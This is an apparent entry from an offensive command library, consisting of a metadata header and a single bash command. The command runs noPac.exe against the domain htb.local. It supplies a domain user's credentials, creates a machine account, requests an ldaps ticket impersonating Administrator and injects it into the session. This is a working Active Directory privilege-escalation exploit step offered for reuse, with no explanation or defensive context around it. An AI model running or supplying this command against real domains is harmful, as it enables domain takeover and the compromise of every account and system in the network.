---
id: 622d564a-0812-4046-b516-1db9590c5159
name: noPac.exe with ldaps service
type: command
executor: bash
data: noPac.exe -domain htb.local -user domain_user -pass "Password123!" /dc dc.htb.local
  /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator
output: null
created_at: '2023-04-06T03:56:03.185902+00:00'
updated_at: '2023-04-10T20:36:11.698743+00:00'
---

# noPac.exe with ldaps service

```bash
noPac.exe -domain htb.local -user domain_user -pass "Password123!" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator
```
